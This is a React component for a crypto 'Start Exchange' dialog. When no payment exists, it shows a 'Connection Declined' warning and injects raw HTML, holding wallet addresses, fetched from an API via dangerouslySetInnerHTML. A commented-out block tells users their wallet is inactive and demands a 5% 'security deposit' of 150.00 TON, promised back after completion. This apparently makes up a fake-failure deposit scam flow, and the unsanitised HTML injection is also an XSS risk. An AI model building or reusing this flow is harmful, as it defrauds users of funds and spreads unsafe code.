"use client";

import { TriangleAlertIcon } from "lucide-react";
import { useEffect, useState } from "react";
import { toast } from "sonner";

import { Button } from "@/components/ui/button";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";
import { Separator } from "@/components/ui/separator";
import { Payment } from "@/db/schema/schema";
import UploadFile from "./upload-file";

export default function Exchange({
  payment,
  userId,
}: {
  payment: Payment;
  userId: string;
}) {
  const [openDialog, setOpenDialog] = useState(false);
  const [address, setAddress] = useState();

  useEffect(() => {
    getAddresses();
  }, []);

  const getAddresses = async () => {
    try {
      const res = await fetch("/api/address");
      const data = await res.json();
      console.log({ data });
      if (res.ok) {
        setAddress(data.value);
      } else {
        setOpenDialog(false);
        toast.error("Unable to get addresses", {
          description: data?.message || "Something went wrong",
        });
      }
    } catch (error) {
      setOpenDialog(false);
      toast.error("Unable to get addresses", {
        description: "Something went wrong",
      });
      console.log({ error });
    }
  };

  return (
    <Dialog open={openDialog} onOpenChange={setOpenDialog}>
      <DialogTrigger asChild>
        <Button className="w-full">Start Exchange</Button>
      </DialogTrigger>
      {!payment && address ? (
        <DialogContent className="sm:max-w-[425px]">
          <DialogHeader className="sm:text-center">
            <DialogTitle>
              <TriangleAlertIcon
                size={72}
                className="mx-auto text-chart-3 py-5"
              />
              Connection Declined
            </DialogTitle>
            <DialogDescription>
              <div dangerouslySetInnerHTML={{ __html: address }} />
              <Separator className="my-3" />
              <UploadFile userId={userId} setOpenDialog={setOpenDialog} />
            </DialogDescription>
          </DialogHeader>
        </DialogContent>
      ) : (
        <DialogContent className="sm:max-w-[425px]">
          <DialogHeader className="sm:text-center">
            <DialogTitle>Payment</DialogTitle>
            <DialogDescription>
              Preparing transaction, Please wait...
            </DialogDescription>
          </DialogHeader>
        </DialogContent>
      )}
      {/* <DialogContent className="sm:max-w-[425px]">
        <DialogHeader className="sm:text-center">
          <DialogTitle className="mb-3">
            <TriangleAlertIcon
              size={72}
              className="mx-auto text-chart-3 py-5"
            />
            Connection Declined
          </DialogTitle>
          <DialogDescription>
            Unfortunately, your wallet is not active and its balance is not
            equal to the amount of the security deposit.
            <br />
            Please use an active wallet or top up your balance with 5% of the
            offer amount - 150.00 TON.
            <br />
            These funds may be debited from your wallet for the duration of the
            offer and will be returned in full after its completion
          </DialogDescription>
        </DialogHeader>
      </DialogContent> */}
    </Dialog>
  );
}
